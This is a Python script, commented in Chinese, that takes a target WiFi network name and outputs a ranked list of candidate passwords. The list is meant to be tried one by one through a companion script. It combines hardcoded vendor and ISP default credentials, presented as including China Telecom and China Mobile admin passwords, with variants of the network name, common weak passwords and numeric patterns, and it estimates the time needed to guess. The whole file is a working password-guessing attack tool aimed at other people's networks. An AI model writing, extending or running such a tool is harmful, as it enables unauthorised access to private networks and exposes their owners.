#!/usr/bin/env python3
"""
pass_candidates.py — 给一个 SSID，生成有序候选密码列表

用法：
    python3 scripts/pass_candidates.py "TP-LINK_5F2A" > candidates.txt
    python3 scripts/pass_candidates.py "TP-LINK_5F2A" --limit 500 --deep

输出：每行一个密码，按命中概率从高到低排列。
      配合 scripts/wifi_try_mac.sh 在 Mac 上逐个试连。

设计思路：不抓包、不破解，只用「人们怎么设 WiFi 密码」的统计规律：
  1. 厂商/运营商出厂默认
  2. SSID 自身、去分隔符版本、尾部随机后缀的派生
  3. SSID 里的数字片段（房号、手机号后几位）
  4. SSID + 常见后缀
  5. 国内高频弱口令
  6. 8 位纯数字的常见排列（生日、连号、重复）
"""

from __future__ import annotations

import argparse
import itertools
import re
import sys

# ---------------------------------------------------------------- 词典

# 厂商 / 运营商出厂默认（含管理后台默认口令，很多设备 WiFi 密码与之一致）
VENDOR_DEFAULTS = {
    "chinanet":  ["nE7jA%5m", "telecomadmin", "admin", "12345678"],
    "telecom":   ["nE7jA%5m", "telecomadmin", "admin"],
    "ctc":       ["nE7jA%5m", "telecomadmin"],
    "cmcc":      ["aDm8H%MdA", "CMCCAdmin", "admin", "12345678"],
    "cmiot":     ["aDm8H%MdA", "CMCCAdmin"],
    "chinaunicom": ["CUAdmin", "admin", "12345678"],
    "unicom":    ["CUAdmin", "admin"],
    "cu_":       ["CUAdmin", "admin"],
    "tplink":    ["tplink123", "admin", "12345678", "tplink888"],
    "mercury":   ["mercury123", "admin", "12345678"],
    "fast":      ["fast1234", "admin", "12345678"],
    "tenda":     ["tenda123", "admin", "12345678"],
    "huawei":    ["huawei123", "admin", "12345678", "huawei888"],
    "honor":     ["honor123", "admin", "12345678"],
    "xiaomi":    ["xiaomi123", "12345678", "mi123456"],
    "redmi":     ["xiaomi123", "12345678"],
    "asus":      ["admin", "password", "asus1234"],
    "netgear":   ["password", "admin", "netgear1"],
    "linksys":   ["admin", "password"],
    "dlink":     ["admin", "password", "dlink123"],
    "phicomm":   ["admin", "phicomm123"],
    "zte":       ["admin", "zte12345"],
    "h3c":       ["admin", "h3c12345"],
    "ruijie":    ["admin", "ruijie123"],
}

# 国内高频弱口令（按经验命中率排序）
WEAK = [
    "12345678", "88888888", "11111111", "00000000", "66666666", "99999999",
    "123456789", "1234567890", "12341234", "11223344", "12121212", "13131313",
    "5201314520", "woaini1314", "woaini520", "1314520a", "abc12345", "abcd1234",
    "a1234567", "aa123456", "abc123456", "qwerty12", "1qaz2wsx", "qazwsx123",
    "q1w2e3r4", "1q2w3e4r", "asdfghjk", "zxcvbnm1", "qwertyui", "iloveyou",
    "password", "passw0rd", "admin123", "admin888", "adminadmin", "root1234",
    "wifi1234", "wifi8888", "wlan1234", "guest1234", "internet", "123123123",
    "147258369", "147852369", "741852963", "963852741", "25802580", "10293847",
    "13800138000", "13900139000", "wang1234", "zhang123", "liu12345",
    "chen1234", "yang1234", "huang123", "zhao1234", "wu123456", "zhou1234",
    "abc12345", "a1b2c3d4", "abcd123456", "abcdefgh", "qq123456", "123456abc",
    "TP-LINK", "tplink", "tenda123", "huawei123", "xiaomi123", "mercury123",
]

# 常见后缀（SSID + 后缀 很常见）
SUFFIXES = ["123", "1234", "12345", "123456", "888", "8888", "666", "6666",
            "000", "0000", "111", "2018", "2019", "2020", "2021", "2022",
            "2023", "2024", "2025", "2026", "a", "aa", "abc", "wifi", "WIFI"]

# 8 位数字的常见模式（生日、连号、重复）
NUM_PATTERNS = [
    "12345678", "87654321", "11111111", "22222222", "33333333", "44444444",
    "55555555", "66666666", "77777777", "88888888", "99999999", "00000000",
    "12341234", "11223344", "12121212", "13131313", "14141414", "15151515",
    "19900101", "20000101", "19910101", "19800101", "19700101",
    "19880808", "19990909", "20080808", "20000101", "19920808",
]

# 重复/连号生成
def numeric_patterns() -> list[str]:
    out = list(NUM_PATTERNS)
    # 全重复 8 位
    for d in "0123456789":
        out.append(d * 8)
    # 递增 / 递减 8 位
    for start in range(0, 10):
        asc = "".join(str((start + i) % 10) for i in range(8))
        desc = "".join(str((start - i) % 10) for i in range(8))
        out.append(asc)
        out.append(desc)
    # 双数字循环
    for a, b in itertools.permutations("0123456789", 2):
        out.append((a + b) * 4)
    return out


# ---------------------------------------------------------------- 生成

def split_digits(ssid: str) -> str:
    return "".join(ch for ch in ssid if ch.isdigit())


def gen(ssid: str, deep: bool = False, limit: int = 400) -> list[str]:
    trimmed = ssid.strip()
    if not trimmed:
        return []

    lower = trimmed.lower()
    digits = split_digits(trimmed)
    compact = "".join(ch for ch in lower if ch.isalnum())
    tail4 = trimmed[-4:].lower() if len(trimmed) >= 4 else ""

    out: list[str] = []

    # 1) 厂商默认
    for prefix, passwords in VENDOR_DEFAULTS.items():
        if lower.startswith(prefix) or prefix in lower:
            out += passwords

    # 2) SSID 派生
    out += [trimmed, lower, trimmed.upper()]
    if compact != lower:
        out += [compact, compact + "123", compact + "1234"]
    out.append(trimmed + "123")
    out.append(lower + "123")
    out.append(lower + "1234")
    out.append(lower + "888")

    # 3) 尾部随机后缀派生（这类 SSID 通常是 名字+4位随机）
    if tail4 and digits:
        out += [tail4, tail4 + tail4, tail4 + "1234", tail4 + "12345678",
                tail4 + "888", tail4.upper()]

    # 4) 数字片段派生
    if digits:
        out.append(digits)
        if len(digits) >= 4:
            out.append(digits * 2)
            if len(digits) < 8:
                out.append(digits + "0" * (8 - len(digits)))
            if len(digits) > 8:
                out.append(digits[-8:])
            out.append(digits[-4:] * 2)
            out.append("1" + digits)
            out.append(digits + "0000")

    # 5) 弱口令
    out += WEAK

    # 6) 后缀组合（SSID 派生 × 常见后缀）
    for base in {compact, lower, trimmed}:
        if not base:
            continue
        for suffix in SUFFIXES[:12]:
            out.append(base + suffix)

    # 7) 数字模式
    out += numeric_patterns()

    # 8) 深度模式：再加全后缀、年份组合、拼音+数字
    if deep:
        for base in {compact, lower}:
            for suffix in SUFFIXES:
                out.append(base + suffix)
        for year in range(1970, 2027):
            out.append(str(year))
            out.append(compact + str(year))
        out += WEAK * 2

    # 去重 + 过滤（WPA 8–63 位）
    seen = set()
    result: list[str] = []
    for candidate in out:
        if not candidate:
            continue
        if not (8 <= len(candidate) <= 63):
            continue
        if candidate in seen:
            continue
        seen.add(candidate)
        result.append(candidate)
        if len(result) >= limit:
            break
    return result


def main() -> int:
    ap = argparse.ArgumentParser(description="生成 WiFi 密码候选列表")
    ap.add_argument("ssid", help="目标 WiFi 名称")
    ap.add_argument("--deep", action="store_true", help="更全（慢，列表更长）")
    ap.add_argument("--limit", type=int, default=400, help="最多输出多少个（默认 400）")
    ap.add_argument("--stats", action="store_true", help="只打印统计，不输出列表")
    args = ap.parse_args()

    candidates = gen(args.ssid, deep=args.deep, limit=args.limit)

    if args.stats:
        print(f"SSID: {args.ssid}")
        print(f"候选数: {len(candidates)}")
        print(f"前 10: {candidates[:10]}")
        est = len(candidates) * 6
        print(f"预计耗时（每次 6 秒）: {est // 60} 分 {est % 60} 秒")
        return 0

    for pw in candidates:
        print(pw)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
